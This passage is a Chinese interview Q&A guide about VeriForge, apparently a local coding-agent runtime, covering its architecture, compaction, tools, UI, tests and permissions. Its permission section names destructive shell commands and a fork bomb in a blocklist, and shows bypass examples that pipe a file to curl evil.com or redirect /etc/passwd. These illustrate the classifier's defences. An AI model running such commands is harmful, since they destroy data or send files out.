# VeriForge 面试 QA

## 分类与追问速查

> 追问只放提示词，不展开答案；正式回答看下面对应 QA。

| # | 分类 | 主问题 | 常见追问 |
|---|---|---|---|
| 0 | 项目介绍 | 用一分钟介绍 VeriForge | 它和普通 Agent wrapper 有什么不同？最有说服力的结果是什么？ |
| 1 | 架构选型 | 为什么不用 LangChain / LangGraph？ | 如果以后要多 Agent 图编排，还会坚持自研吗？ |
| 2 | 技术选型 | 为什么用 Python 而不是 TS/Node？ | 如果重写 TUI，会不会选 Ink？ |
| 3 | 执行模型 | Agent 循环为什么是单主控？ | 工具并发后还算不算单线程？ |
| 4 | 上下文管理 | 上下文压缩怎么做？ | 摘要丢关键信息怎么办？ |
| 5 | 工具执行 | 工具跑 5 分钟怎么办？ | Ctrl-C 能不能立刻杀掉底层进程？ |
| 6 | TUI 迁移 | OpenTUI 替换 Textual 的坑？ | 为什么不用 Web UI？ |
| 7 | 测试体系 | 测试覆盖了哪些场景？ | TUI 和审批流怎么自动化测试？ |
| 8 | LLM 适配 | OpenAI SDK breaking change 怎么办？ | 怎么支持 Anthropic / Gemini？ |
| 9 | 权限治理 | 为什么不是 RBAC？ | 如何做到命令级 allowlist？ |
| 10 | 中间件设计 | 中间件冲突怎么办？ | first-wins 会不会吞掉重要提示？ |
| 11 | 恢复与交互 | Agent 反复调用同一工具怎么办？ | 用户中途补充需求如何不丢上下文？ |
| 12 | Profile / 会话 | profile 切换会丢上下文吗？ | plan 到 coding-agent 怎么 handoff？ |
| 13 | 反思改进 | 如果重写会改什么？ | 哪些设计现在看过度了？ |
| 14 | 范围取舍 | 一周版本会砍什么？ | MVP 最小闭环是什么？ |
| 15 | 竞品定位 | 和 Claude Code / Cursor / Aider 差异？ | 用户为什么不用现成产品？ |
| 16 | 核心理念 | 怎么体现 Harness？ | Harness 和普通 agent wrapper 差在哪？ |
| 17 | 架构综述 | 七个维度分析 Harness 设计 | 哪一层是最关键的？ |
| 18 | Runtime 架构 | 完整 runtime 设计 | 数据流从输入到工具结果怎么走？ |
| 19 | 项目挑战 | 最大挑战是什么？ | 为什么上下文管理最难？ |
| 20 | 工程难点 | 最困难/印象最深的地方？ | 并发和进程管理踩过什么坑？ |
| 21 | 并行调度 | 工具和子代理并行怎么实现？ | 为什么不做激进依赖分析？ |
| 22 | 创新点 | 最有创新性的地方？ | Fact Invalidation 怎么避免误伤？ |
| 23 | 设计借鉴 | 参考了 Claude Code / Codex 哪里？ | 哪些是借鉴，哪些是你自己的改造？ |
| 24 | Multi-Agent | Multi-Agent 怎么体现？ | 和 AutoGen / CrewAI 的区别？ |
| 25 | 可靠性 | 大模型幻觉怎么 Harness？ | 如果验证也被模型带偏怎么办？ |
| 26 | 质量保障 | Vibe coding 怎么确认代码质量？ | 怎么平衡速度和工程纪律？ |
| 27 | Prompt Cache | Prompt Cache 怎么设计的？效果怎么量化？ | prefix 变了怎么办？compaction 会破坏 cache 吗？ |
| 28 | Memory 系统 | 长期记忆如何存储、召回和纠错？ | 为什么 Markdown 是事实源？如何避免过时结论？ |
| 29 | 评估体系 | 8/24/full task set 怎么选？结果口径为什么用 ledger？ | 如何保证不是 cherry-picked？改进方向？ |
| 30 | Profile 路由 | Profile 和 Agent 的职责边界？怎么选 profile？ | 路由出错怎么兜底？新增 profile 要改什么？ |
| 31 | Shell / Sandbox | Windows Shell 和 Docker sandbox 怎么设计？ | 为什么不自动从 pwsh 降级到 WSL？Docker 是否等于绝对安全？ |
| 32 | MCP 扩展 | MCP 工具怎么接入且不绕过权限？ | 工具太多会不会破坏 Prompt Cache？远端服务失败怎么办？ |

---

## Q: 请用一分钟介绍 VeriForge

> VeriForge 是一个面向真实本地仓库的可验证 Coding-Agent Runtime。模型负责理解任务和生成决策，Runtime 负责把这些决策放进可治理的执行环境：Profile 定义任务模式，Tool Registry 和 Permission Middleware 控制工具与风险，Workspace Service 约束路径，ToolExecutor 对安全读操作和 delegated agents 做保守并行，中间件处理循环检测、错误恢复、时间预算、任务跟踪和退出验证，Session/Event/Observation 系统负责复盘与旧事实失效。
>
> 它不是只做“LLM + Shell”。长运行命令会后台化；Windows 可以明确选择 PowerShell 7 或 WSL，且不会静默切换语义；不可信命令可进入 Docker sandbox；复杂任务可以委派给只读 Agent，或者让 Patch Agent 在临时副本中提出 Diff，但主工作区始终由单一 orchestrator 决策。上下文接近上限时会在完整工具调用边界生成结构化工作摘要，原始逻辑消息保留在 JSONL 手账中；跨会话事实通过可验证的 Markdown Memory 按需召回。
>
> 评测上，我没有只挑一次成功 run，而是用 task-level ledger 从 raw Harbor/Terminal-Bench artifacts 重建结果。在 Terminal-Bench 2.1 的完整 89 任务分母下，`DeepSeek-V4-Flash-Preview` 经 VeriForge 运行后的本地 ledger 是 `56/89`、`62.9%`；这不是严格同场的 leaderboard 声明。官方 DeepSeek Harness 的同模型参考值是 `61.8%`，运行配置不同，只作为背景参照。这里要看的不是模型单项分数，而是 Profile、工具治理、恢复、验证和评测记录能否一起工作。

### 20 秒版本

VeriForge 是一个可验证的本地 Coding-Agent Runtime：它用 Profile、权限、Workspace、恢复和退出验证约束模型执行，用保守并行、隔离 Patch、上下文压缩和 Memory 提高长任务完成率，再用 eval ledger 从原始证据重建真实结果，而不是相信模型说“完成了”。

### 面试官追问“最核心的差异是什么？”

普通 wrapper 主要解决“怎么调用模型和工具”；VeriForge 重点解决“工具在哪里执行、什么操作允许、失败后怎么恢复、旧事实何时失效、完成如何验证、结果如何审计”。一句话是：**不是让模型更自由，而是让模型的每次自由都有边界和证据。**

---

## Q: 为什么不用 LangChain / LangGraph 这种成熟框架？

> 这个项目的核心价值在 runtime 交互层（权限控制、中间件链、TUI 体验、会话持久化），不在 LLM 调用编排层。用框架会把复杂度从"我们能控制的地方"转移到"我们控制不了的地方"。

### 技术层面：抽象不匹配

LangChain/LangGraph 的核心抽象是 **Chain/Graph** — 把任务拆成节点和边。但我们的 Agent 是一个 **单循环 + 工具调用** 的模式，用 OpenAI 原生的 function calling 就够了。套框架等于引入一套图编排机制，但我们根本不用图。

我们的工具系统需要 runtime 权限、profile 级工具面、命令风险分类一起工作，每个工具调用还要过中间件链（循环检测、时间预算、错误恢复、退出守卫）。这些能力即使用 LangGraph 也仍然需要自己实现，框架不会替我们定义本地工作区、审批、Shell 和验收语义。

### 工程层面：依赖成本

VeriForge 是本地 CLI，已经需要维护 OpenTUI 前端、Playwright、MCP 和评测依赖；没有必要再为当前固定的单主控循环引入一层图状态和框架生命周期。LLM 层通过 OpenAI-compatible Chat Completions、streaming 和 tool calls 工作，Provider 差异集中在适配与配置层。

### 设计层面：控制点选择

Agent 框架帮你解决的是 **"怎么编排 LLM 调用"**，但这个项目的难点不在这里。难点在：

- 权限审批流（inline approval panel，持久化 allowlist）
- 上下文窗口管理（自动压缩、阈值触发、token 精确计数）
- 中间件可组合性（用户 profile 注入不同的中间件链）
- TUI 交互体验（streaming、取消、补全、modal 面板）

这些是框架不覆盖的，也是项目的差异化所在。如果用框架，我们还是要自己写这些，同时还要维护和框架的适配层。

### 收尾

如果项目目标是快速做个 RAG chatbot 或多 Agent 协作系统，我会选 LangGraph。但这个项目的核心是 **单 Agent 的 runtime 体验**，自研循环、依赖 openai SDK 做调用，是复杂度最低的方案。

**关键心法**：不要说"框架不好"，要说"框架解决的问题不是我们的问题"。展示你理解框架的能力边界，而不是排斥框架。

---

## Q: Claude Code 源码用 TypeScript 写的，为什么你的 runtime 仍用 Python，UI 又改成 React/Bun？

> TS/Node 完全能写 coding agent，Claude Code 已经证明了。VeriForge 现在采用的是分层取舍：Agent、工具、权限、会话和评测继续用 Python，交互界面改成 Bun + React + OpenTUI。不是坚持一种语言，而是把状态丰富、需要快速迭代的终端 UI 放到更合适的组件模型里。

### 真实原因：个人效率

我是 Python 背景，最初用 Python 完成 agent loop、工具执行、权限、中间件、session 和 eval，能最快把 runtime 的关键边界做实。这部分已经有大量 unittest 和评测脚本，迁到 Node 不会自动带来架构收益，反而会扩大重写面。

### Python 确实有一些实际好处

- **Agent 与评测生态顺手**：OpenAI-compatible SDK、tiktoken、unittest、Harbor adapter 和本地自动化都能直接使用 Python。
- **同步主循环与当前控制模型匹配**：决策顺序是“发请求 → 执行一批工具 → 回写结果 → 下一轮”；安全读工具在 `ToolExecutor` 内部用线程池并行，不需要把整个 runtime 改成 async。
- **个人实现效率高**：对单人项目来说，熟悉度直接影响能否把权限、恢复、会话和评测真正做完整。

### 为什么 UI 改用 OpenTUI

- **组件和状态模型更适合交互界面**：命令补全、可搜索面板、审批/问题选择、鼠标操作、响应式布局，都更适合 React 组件和 reducer 管理。
- **类型边界更清楚**：`protocol.ts` 显式定义 UI event、action、panel 和 interaction，前端可独立做 TypeScript 检查。
- **保留 Python 的 runtime 投资**：Python 仍是唯一业务执行端；OpenTUI 只渲染状态和收集交互，不复制工具、权限或会话逻辑。

代价是需要同时分发 Python 与 Bun，调试时还要跨 NDJSON 协议定位问题。因此 bridge 必须保持窄：Python 输出事件、快照和交互请求，前端回传 submit、cancel、panel action 和用户选择。

### Claude Code 为什么用 TS？

Claude Code 选择 TS 有它自己的产品、团队和分发生态背景，但这不能推出所有 agent runtime 都应该用 TS。VeriForge 的取舍依据是模块职责：Python 负责执行语义，React/OpenTUI 负责终端交互。

### 总结

技术选型不是整仓二选一。当前方案把已有、稳定且测试充分的 Python runtime 保留下来，同时用 OpenTUI 改善 UI；真正需要守住的是 bridge 只传协议，不让业务规则在两边各实现一遍。

**关键心法**：承认自己选择的局限性，比硬吹优势更有说服力。

---

## Q: 你的 Agent 循环是单线程阻塞的，如果用户同时要处理多个任务怎么办？有没有考虑过并发 Agent？

> 当前设计是**单主控 Agent 循环**，不是多个 Agent 同时抢决策权。工具层现在有保守并发，但那是执行优化，不是并发 Agent。

### 为什么是单线程

Agent 决策循环的核心流程还是串行的：发 LLM 请求 → 等响应 → 执行这一批工具调用 → 把结果写回上下文 → 再发下一次请求。模型只有看到上一批工具结果后，才应该做下一步决策。

但"执行这一批工具调用"不再是傻傻全串行。`ExecutionPlanner` 会为内置工具、MCP 和 `run_bash` 统一解析 `CallEffect`，根据精确文件、目录子树、全局资源和控制屏障建立依赖图。不同文件的结构化写可以并行，重叠资源的读写按模型原始顺序执行；结果仍按原始 tool-call 顺序写回。

循环在 `AgentConversation.run_until_idle()` 中实现，是一个 bounded for 循环（默认最多 60 次迭代）。每次迭代：取消检查 → 中间件钩子 → 上下文生命周期检查 → LLM 调用 → `ToolExecutor` 按资源计划执行工具 → 后处理。

### 后台线程边界

上下文压缩主路径不再使用后台候选线程。接近 85% 时，Agent 在 turn 边界同步摘要当前 turn 之前的旧 conversation。这样不会留下 stale candidate，也不会在 profile/tools schema 切换时把旧 prefix 误带回来。

仍然存在的线程边界主要是工具执行、取消和 UI/运行时通信：

1. **CancellationToken** — 用 `threading.Event` 实现跨线程取消信号。TUI 线程调用 `cancel()`，Agent 循环在每个迭代边界检查。
2. **ToolExecutor worker** — 当前 wave 中无资源冲突的调用会放进线程池并发执行，结果仍然回到主线程按原始 tool call 顺序写入 conversation。
3. **MCP / shell 等 runtime 边界** — 这些组件可能有自己的 reader 或事件线程，但它们不参与上下文压缩决策。

### 子代理如何运行

`spawn_agent` 会创建 session 级后台 Agent，主 Agent 不必等它结束。多个 Agent 共享并发限流器和资源协调器，但各自有独立对话与取消令牌。

只读角色直接读取主工作区。`worker` 使用持久隔离副本，完成后保存完整的 `ChangeProposal`，可通过 `read_agent_changes` 分页复查。主 Agent 通过 `apply_agent_changes` 做三方合并；无重叠修改自动合并，真实冲突返回 conflict id，不直接写入主工作区。

`send_agent_message` 会立即把消息放入运行中 Agent 的队列，并在下一个安全迭代边界注入。它不会等待整个子任务结束，也不会中断当前正在执行的工具；`followup_agent` 则用于继续已结束的 Agent。

`wait_agents` 只根据选中 Agent 的终态判断完成，不会因为另一个 Agent 有状态变化就提前返回。关闭 Agent 时先在协调器锁内标记为 closing，再清理 conversation 和隔离资源，避免和 followup 并发复活同一个 Agent。

---

## Q: 上下文压缩用的是什么策略？直接截断还是摘要？压缩后信息丢失怎么处理？

> 用的是 **结构化工作摘要 + append-only SessionJournal**。系统只在安全边界压缩当前 turn 之前的旧 conversation；摘要失败时保持原上下文，恢复与 fork 都能从原始逻辑消息重建。

### 压缩策略：LLM 摘要

`compact_messages()` 的流程：

1. 把消息分成"旧消息"和"近期消息"两部分
2. 旧消息展平成文本，发给 LLM 生成结构化摘要
3. 摘要替换旧消息，作为一条 `[COMPACTED CONTEXT]` 用户消息
4. 近期消息原样保留

分割点的选择有讲究：

- 默认保留最近 30% 的消息（最少 4 条）
- 正常模式下，从最后一条用户消息之后切割（不会在一轮对话中间断开）
- `_safe_split_index()` 向后回溯，避免把 `tool_call` 和对应的 `tool_response` 拆到两边
- 如果指定了目标 token 数，`_fit_tail_start_to_budget()` 会迭代调整分割点直到压缩结果在预算内

### 单阈值触发

基于 `CONTEXT_WINDOW_TOKENS`（默认 200,000）的单个关键水位：

| 阈值 | 百分比 | 触发动作 |
|------|--------|----------|
| compact | 85% | 启动 auto-compaction |

85% 以下不自动压缩。达到 85% 时，用 LLM 摘要当前 turn 之前的旧 conversation，并保留当前 user turn 的原始消息。

### 防止信息丢失的机制

1. **CompactionGate** — 有工具在执行时不允许压缩，避免打断 tool call/tool result 语义。
2. **当前 turn 保护** — auto-compaction 只处理当前 turn 之前的内容，当前任务和最新工具输出完整保留。
3. **摘要旧历史** — 旧 conversation 被替换成 `[COMPACTED CONTEXT]`，保留决策、约束、改动文件、错误和下一步。
4. **每 turn 最多一次** — summary 后仍超过 85% 时，本 turn 暂停 auto-compaction，避免 thrashing。
5. **失败不提交** — 摘要调用失败或没有有效内容时，不写压缩边界，也不清空原上下文；本 turn 暂停再次自动压缩。

### 信息丢失是必然的，关键是怎么管理

压缩摘要必然有损，但原始历史没有被删除。`SessionJournal` 逐条记录逻辑消息、tool call/result 关联和压缩边界；恢复时使用最近有效摘要、边界后的原始消息和当前工作状态。摘要负责模型预算，手账负责审计和恢复，两者职责分开。

---

## Q: 如果一个工具跑了 5 分钟，用户只能干等？

> 要分情况。普通短工具会等结果返回；资源不冲突的工具可以并发；长运行 shell 命令会后台化，不会一直卡住主循环。

### 工具执行模型

每个工具函数本身还是普通同步函数，但 `ToolExecutor` 会把安全的连续读类工具放进线程池并发跑。写文件、`update_plan_state`、有副作用 shell 仍然串行，因为这些操作会改变状态，不能乱序。

`run_bash` 还有一条特殊路径：如果识别出 `npm run dev`、`vite`、`uvicorn` 这类长运行服务命令，就不会等它跑完，而是启动成后台 job，返回 `shell-job-xxx`。Agent 后续用 `read_shell_output` 看日志，用 `stop_shell_job` 收尾。

### 超时保护

- **`run_bash`** 有 per-command 超时（默认 300 秒）。普通命令超时后会尝试 interrupt；长运行服务命令会更早返回 job id。
- **`spawn_agent`** 默认最多 6 turns、300 秒，参数限制为 1–20 turns、30–1800 秒；子 Agent 不能递归委派。
- **`browser_test`** 使用 Playwright 的同步 API，Playwright 自身有超时机制。

### 时间预算中间件

`TimeBudgetMiddleware` 在 60% 和 85% 时提示收尾；达到硬预算后，`TurnController` 终止当前回合并记录 fallback 原因。

### Ctrl-C 取消

用户按 Ctrl-C 时，`CancellationToken` 会停止等待并触发已注册的清理回调。LLM stream、MCP、浏览器和前台 Shell 都接收同一个令牌；通用工具仍在执行时由 session 级 supervisor 跟踪到结束。

后台 Shell job 不会因一次回合取消而自动删除，仍由 `job_id` 管理，并在显式停止或 session 关闭时清理。

### 如果面试官追问"为什么不在工具内部也检查取消？"

Tool runner 会把 `cancellation_token` 注入声明支持它的工具，并让 `CancelledError` 直接向上传播。无法协作取消的第三方调用不会再写回当前回合，但仍需等待自身返回或超时后才能释放底层资源。

---

## Q: 你用 OpenTUI 替换了 Textual，迁移过程中遇到的最大坑是什么？

> 最大的坑是 **输入事件所有权** 和 **跨进程状态同步**。UI 从 Python 进程里的 Textual 迁到 Bun + React + OpenTUI 后，渲染更灵活，但运行时与界面之间必须通过协议协作。

### 输入事件所有权

OpenTUI 的 textarea 需要显式配置 `keyBindings`，才能稳定实现 Enter 提交、Shift+Enter 换行。更麻烦的是同一个 Enter 在命令补全面板打开时应该“接受候选”，不能同时把旧的 `/` 草稿提交给 Python。

实现上，补全面板消费 Up/Down/PageUp/PageDown/Home/End、Enter/Tab 并调用 `preventDefault()`；Esc 不再负责关闭补全，点击遮罩外层关闭，清空或修改 `/`、`@` 指令后重新计算是否显示。textarea 的 `onSubmit` 还会再次检查 palette 是否打开，防止一次按键同时完成补全和提交。审批/问题交互出现时，普通面板会卸载，避免键盘事件串扰；自定义输入获得焦点后，数字快捷键和方向导航也会交给输入框。

### 跨进程状态同步

Python 侧仍由 `InteractiveSession`、Agent worker、EventBus 和同步 approval/question provider 掌握真实状态；OpenTUI 在 Bun 子进程中只持有渲染快照。两者用 stdin/stdout 上的 NDJSON 通信：Python 发 `snapshot`、`transcript`、`interaction`、`turn_state` 等事件，前端回传 `submit`、`cancel`、`action` 和 `resolve_interaction`。

关键边界是不能把业务状态复制到前端：profile 切换、checkpoint、MCP、权限、session 恢复和报告导出都由 Python bridge 调用 session API，前端只展示 panel 与选择结果。新会话或历史恢复时，Python 发出 `session_reset`，前端一次性替换 transcript，并清掉旧 interaction 和输入草稿。

### 其他小坑

- **首帧不能等 Python session**：Bun 先绘制 shell，Python session 在后台初始化；bridge 返回 starting，前端等 progress=ready 后才提交任务或执行会话动作。
- **初始化竞态会丢任务**：首次任务和按钮动作通过 ready gate 排队；session 构造失败会明确拒绝等待中的请求并清理状态。
- **交互失败不能卡窗**：resolve_interaction 失败时 bridge 和前端都会发出 interaction_closed，避免审批弹窗永久占用输入。
- **全局快捷键会污染输入**：`?`、Ctrl+N、Ctrl+C 等必须 `preventDefault()`，新会话还要强制 remount composer 才能清掉 textarea 内部草稿。
- **终端宽度不是字符数**：中文和宽字符的截断用 `stringWidth`，命令名和说明保持单行、左对齐并显示省略号。
- **两套测试**：Python 测 bridge、session 和协议行为；Bun 测 reducer、主题/图标、附件工具函数以及 OpenTUI 交互行为。

---

## Q: 你的测试覆盖了哪些场景？Approval 面板的交互逻辑怎么测的？TUI 的 streaming 怎么测的？

> 测试按 runtime 与 UI 两侧拆分：Python 覆盖 Agent、工具、中间件、会话、bridge 和评测；Bun 覆盖 OpenTUI 的 reducer、主题/图标、附件工具函数和交互行为。

### 测试结构（数量随提交变化，以实际运行结果为准）

| 层次 | 文件 | 覆盖内容 |
|------|------|----------|
| 前端状态与工具函数 | `frontend/opentui/src/state.test.ts`, `frontend/opentui/src/attachment-utils.test.ts` | reducer、session reset、主题/图标、附件路径解析和格式化 |
| Python UI bridge | `test_attachment_bridge.py`, `test_terminal_ui.py`, `test_tui_protocol.py` | NDJSON 请求/事件、附件、panel/命令入口、session 初始化和交互关闭 |
| 中间件 | `test_product_runtime.py`, `test_task_tracking.py`, `test_recovery_strategy.py`, `test_acceptance_planning.py`, `test_tool_policy.py` | 中间件链、权限审批、错误恢复、任务追踪、acceptance checks、shell policy |
| 工具运行时 | `test_tool_executor.py`, `test_parallel_tool.py`, `test_shell_session.py`, `test_shell_jobs.py`, `test_skill_catalog.py` | 资源规划、并行执行、后台 job、工具注册、deferred tool reveal、skill registry 和 skill 文件读取 |
| 会话 / 评估 / 记忆 | `test_observability.py`, `test_eval_suite.py`, `test_eval_ledger.py`, `test_terminal_bench_launcher.py`, `test_terminal_runner_artifacts.py`, `test_memory.py` | 事件记录、评估汇总、ledger、Terminal-Bench launcher / artifacts、记忆检索 |
| Agent 循环 | `test_compaction.py`, `test_profiles.py`, `test_delegate_agent.py`, `test_tool_policy.py` | 上下文压缩、路由、后台 Agent、隔离提案、三方合并与工具策略 |

### Approval 面板怎么测

Approval 面板按 runtime、协议和 UI 三层验证：

1. **Allowlist 单元测试**：直接测试 `ApprovalAllowlist` 的前缀匹配和持久化，不涉及 UI。
2. **协议与状态测试**：`test_tui_protocol.py` 覆盖 initialize、starting、交互失败关闭和 BrokenPipe；Bun `state.test.ts` 覆盖 interaction/session reset reducer。
3. **中间件集成测试**：在 `test_product_runtime.py` 中，用 `FakeClient` 返回 tool_call，用 `StaticApprovalProvider` 验证批准/拒绝路径和 `[approval_denied]` 阻塞消息。

### Streaming 怎么测

Python 侧在 `test_attachment_bridge.py`、`test_tui_protocol.py` 和相关 session 测试中验证 bridge 请求、事件和 session 状态；前端的 `state.test.ts` 直接把 `UiEvent` 喂给 reducer，验证 transcript、interaction 和 session reset。

### Mock 模式

- `FakeClient` / `SimpleNamespace` — 构造确定性的 Chat Completions、session 和事件对象，不访问真实 API。
- `StaticApprovalProvider` / `StaticQuestionProvider` — Python runtime 的确定性交互替身。
- `FakeConversation` / fake session — 记录提交、动作和事件，隔离 bridge 测试。
- Bun state/utility tests — 验证 reducer、主题/图标和附件输入。

---

## Q: 如果 openai SDK 的 API breaking change 了，你的代码要改多少地方？

> Provider 差异和消息归一化主要集中在 `agent/providers.py`，但我不会夸成“只改一个文件”。当前仍有多个 Chat Completions 调用点；如果 SDK 只改响应字段，适配层能吸收大部分变化，如果连调用入口都变了，还要同步修改 conversation、审批、验收、退出验证和 turn summary 等少量边界。

### 隔离层：ProviderAdapter

`ProviderAdapter` 负责最容易漂移的 Provider 差异。它有三个关键方法：

- `chat_kwargs()` — 构建 `client.chat.completions.create()` 的参数
- `assistant_message_from_response()` — 把非流式响应转成内部消息格式
- `assistant_message_from_stream()` — 把流式 chunks 累积成一条完整消息

`get_client()` 函数管理 `OpenAI` 客户端的单例创建。

### 如果 API breaking change

假设 OpenAI 把 `chat.completions.create()` 改成了 `chat.complete()`，或者把 `tool_calls` 的结构从数组改成了字典，需要分两种情况：

1. **请求/响应 Schema 变化**：优先修改 `providers.py` 的 `chat_kwargs()`、`assistant_message_from_response()` 和 `assistant_message_from_stream()`。
2. **SDK 调用入口变化**：还要修改 `conversation.py`、`runtime/approvals.py`、`acceptance_review.py`、`verification.py`、`sessions/turn_summary.py` 等直接调用 `chat.completions.create()` 的边界。

工具执行、Workspace、Profile、TUI 和大部分 Middleware 操作的是内部消息与 `ToolResult`，不需要跟着 Provider 响应格式一起变化。

### 但当前耦合度确实不低

`providers.py` 直接 import `from openai import OpenAI`，多个运行时节点也直接调用 Chat Completions，没有统一的 `LLMClient` Protocol。如果要原生支持 Anthropic Messages 或 Gemini，而不是只接它们的 OpenAI-compatible 网关，我会先定义 `LLMClient` Protocol，把 streaming、tool calls、usage 和 reasoning metadata 统一到内部结果，再逐步迁移这些调用点。

---

## Q: 为什么权限系统是三档 runtime 权限，而不是更细粒度的 RBAC？

> 因为这个工具的使用场景是**单用户本地 CLI**，不是多用户服务。三档 runtime 权限 + profile 级只读约束已经够用，RBAC 会引入不必要的复杂度。

### 实际权限边界

- **workspace-write**：默认模式。允许读工具、工作区内写工具、控制工具和安全 shell；risky shell / unknown / dangerous 需要审批；黑名单 shell 直接拒绝。
- **llm-auto**：自动审批模式。允许范围和 `workspace-write` 一样，但原本需要用户批准的 risky shell、unknown、dangerous 调用交给 fast 模型判断；低置信或审批失败默认拒绝，黑名单 shell 仍然硬拒绝。
- **danger-full-access**：受控 benchmark 或本地强信任场景使用。非黑名单工具直接放行，但 `rm -rf /`、`dd of=/dev/sda` 这类 `shell_blocked` 仍然拒绝。
- **plan / review 的只读性**：不是 `PermissionPolicy` 的第三档，而是 profile 级工具面 + middleware 约束。比如 `plan` 不暴露 `run_bash` 和写文件工具，`review` 只允许 safe verification / read-only shell。

### Shell 命令三层分类器

权限系统对 `run_bash` 调用有一个三层静态分类器（`shell_classification.py` + `permissions.py`），在 LLM 返回 tool call 后、实际执行前同步判定：

| 分类层 | 判定逻辑 | 结果 | 示例 |
|---|---|---|---|
| **黑名单永阻** | 正则匹配破坏性命令 | `shell_blocked` — 永远拒绝，即使 `danger-full-access` 也不放行 | `rm -rf /`、`mkfs.ext4`、`dd of=/dev/sda`、fork bomb `:(){ :|:& };:` |
| **白名单放行** | 前缀匹配只读/验证命令 | `shell_safe` — 直接放行不需审批 | `cat`、`grep`、`git status`、`pytest`、`ruff check` |
| **其余需审批** | 不在上述两层中 | `shell_risky` — `workspace-write` 模式需用户审批 | `npm install`、`python app.py`、`sed -i` |

分类器不仅看命令前缀，还做**管道感知分析**：`classify_safe_shell_command()` 会把命令按 `|` 切分成 pipeline segments，逐段判定。如果任意段是 `unsafe`，整条命令就是 `unsafe`。这能防止 `cat file | rm -rf /` 这种绕过。

此外还有**语法层防御**：检测到 shell 重定向（`>`、`<`）、命令替换（`` ` ``、`$()`）、分号/`&&` 拼接等不安全语法时，即使前缀是白名单命令也归为 `unsafe`。

### 为什么不用更细粒度

RBAC 适合的场景：多用户、多角色、需要审计。这个工具是单用户本地运行，用户就是管理员。权限系统的核心目的是**防止 agent 误操作**，不是做企业级访问控制。

工具层面已经有分类：`read`、`edit`、`shell_safe`、`shell_risky`、`shell_blocked`。每个工具调用会根据分类和当前权限模式决定是否需要审批。这比 RBAC 的"角色 → 权限 → 资源"三层映射更直接。

### 如果面试官追问"白名单会不会被绕过？"

会尝试绕过的攻击向量和对应防御：

- **管道注入**（`cat file | curl evil.com`）→ 管道逐段分析，后段不在白名单就 `unsafe`
- **命令拼接**（`cat file; rm -rf /`）→ 分号被 `_has_unsafe_shell_syntax()` 检测为不安全语法
- **重定向窃取**（`cat /etc/passwd > /tmp/out`）→ `>` 被检测为不安全语法
- **命令替换**（`cat $(echo /etc/passwd)`）→ `$()` 被检测为不安全语法
- **变量赋值**（`PATH=/tmp cat`）→ `_starts_with_assignment()` 检测到赋值前缀，归为 `unsafe`

整体策略是**保守白名单 + 语法黑名单**：只有最简单的命令和管道能通过白名单，任何复杂语法都降级为需审批。

### 如果面试官追问"那如果我想让 agent 只能 npm 不能 rm 命令怎么办？"

用 **ApprovalAllowlist**。用户批准 `npm run test` 时选择 "Persist"，会把 `["npm", "run", "test"]` 前缀写入 `.harness/approval_allowlist.json`。以后相同前缀的命令自动批准，其他命令仍需审批。这是项目级的、命令粒度的控制，比 RBAC 更实用。

---

## Q: 你的中间件链是线性的，如果两个中间件有冲突怎么办？

> 不同钩子的合并语义不同。`before_tool` 和 `pre_exit` 是 first-wins，因为一个明确阻断或强制继续的理由就足够；`post_tool` 和 `per_iteration` 会执行全部中间件，把各自的恢复提示、状态更新和观测都保留下来。

### 执行模型

中间件存在一个普通 list 中，按顺序遍历。对于不同钩子：

- **`before_tool`**：遍历中间件，第一个返回拦截字符串的胜出，工具不执行。
- **`post_tool`**：全部执行；每个非空注入都会进入 deferred user messages，避免前一个恢复提示遮掉后一个状态更新。
- **`pre_exit`**：第一个返回注入的中间件强制继续，后续中间件本次不再检查。
- **`per_iteration`**：全部中间件都执行，所有注入都应用（不 break）。

### 典型的中间件顺序

coding-agent profile 的核心执行中间件顺序：

1. `LoopDetectionMiddleware` — 检测重复编辑/命令
2. `ErrorGuidanceMiddleware` — 匹配错误模式给出恢复建议
3. `AcceptanceReviewMiddleware` — 对退出条件做快速验收审查
4. `TaskTrackingEnforcementMiddleware` — 强制任务状态更新
5. `RecoveryStrategyMiddleware` — 根据失败模式限制操作
6. `PreExitVerificationMiddleware` — 退出前强制验证
7. `TimeBudgetMiddleware` — 时间预算警告

交互 session 随后还会追加 `ToolPolicyMiddleware`、`PermissionMiddleware` 和 `StaticVerifierMiddleware`。Memory 不在 middleware 栈中：启动索引属于 system prompt 构建，按 turn 召回由 `MemoryService` 完成，生命周期操作通过独立工具暴露。

这个顺序是有意设计的：

- 循环检测在错误指导之前，因为循环警告比错误恢复更紧急
- 恢复策略在退出验证之前，因为恢复模式的约束要在验证门之前生效
- 时间预算在 `per_iteration` 中全部执行，不受 first-wins 影响

### 实际冲突场景

场景：agent 连续编辑同一个文件并反复失败。

1. `LoopDetectionMiddleware` 检测到重复编辑，返回"请换个方案"
2. `RecoveryStrategyMiddleware` 检测到重复失败，进入 `RETHINK` 模式
3. 在 `before_tool` 阶段，第一个明确阻断会直接阻止本次工具执行；如果工具已经执行，多个 `post_tool` 提示则可以同时进入下一轮

这种差异不是偶然：阻断必须确定，观测和恢复信息则不应静默丢失。中间件顺序仍然重要，但不能把整条链概括成统一的 first-wins。

---

## Q: Agent 反复调用同一个工具怎么办？如果用户要补充信息，怎么优雅地追加到同一个任务里？

> 我会把它分成两类问题：一种是 agent 自己卡住了，在重复调用工具；另一种是用户发现需求没说全，需要补充上下文。前者靠 runtime 检测和打断，后者靠同一个 session 追加用户 turn，而不是重开一个任务。

### 反复调用同一工具怎么处理

这里不是靠 prompt 里一句"不要重复"解决，而是在 `LoopDetectionMiddleware` 里做运行时检测。

第一类是 **完全相同的工具调用**。系统会把 `tool_name + tool_args` 做 fingerprint，如果连续 3 次一样，就注入系统提示："你已经连续做了同一个 tool call，不要再重复，换策略或总结当前信息。"如果同一个 fingerprint 已经警告过还继续重复，会触发 `AgentFallbackState.request_stop(reason="loop_detected")`，让当前 turn 停下来，避免无限烧 token。

第二类是 **类似 shell 命令重复**。比如 `python app.py`、`python ./app.py 2>&1`、`python app.py | head`，表面不同，但语义一样。`LoopDetectionMiddleware` 会 normalize command，去掉 `2>&1`、`| head`、`./` 这些噪声；连续 3 次相同就提示这是 doom loop，让 agent 重新读错误输出、换思路。

第三类是 **同一文件反复编辑**。同一个文件编辑次数超过阈值后，会提示它停下来重新理解需求。后面 `RecoveryStrategyMiddleware` 还会接管重复失败：环境问题进 `ENV_FIX`，重复验证失败进 `SPEC_RECHECK`，再继续乱改就进 `RETHINK`，并设置 `replan_required`。这时普通 progress 不能清掉状态，必须 `update_plan_state(update_kind="replan")`，然后进入 `PROBE` 做一次低成本只读验证。

### RecoveryStrategyMiddleware 状态机详解

